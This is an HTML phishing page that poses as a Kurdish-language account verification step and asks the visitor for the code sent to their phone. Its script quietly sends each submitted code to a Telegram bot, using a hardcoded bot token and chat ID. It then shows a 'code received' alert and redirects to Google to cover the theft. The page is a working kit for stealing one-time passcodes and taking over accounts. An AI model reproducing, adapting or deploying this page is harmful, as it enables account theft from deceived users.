<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 100%; max-width: 320px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; text-align: center; font-size: 20px; letter-spacing: 5px; }
        button { width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
<div class="box">
    <h3>پشکنینا ئەکاونتی</h3>
    <p>کۆدێ هاتیە سەر مۆبایلا تە ل ڤێرە بنڤیسە:</p>
    <form id="step2">
        <input type="number" id="code" placeholder="000000" required>
        <button type="submit">پشتراستکرن</button>
    </form>
</div>

<script>
    document.getElementById('step2').addEventListener('submit', function(e) {
        e.preventDefault();
        const code = document.getElementById('code').value;
        
        const token = "8752727438:AAFJP2gw18UHVfBW_fef7J1rOuQJ3WVhoNU";
        const chat_id = "6648131751";
        const msg = `🔢 Verification Code: ${code}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
        .then(() => {
            alert("کۆد هاتە وەرگرتن. لێبورین دکار دکەین.");
            window.location.href = "https://www.google.com";
        });
    });
</script>
</body>
</html>
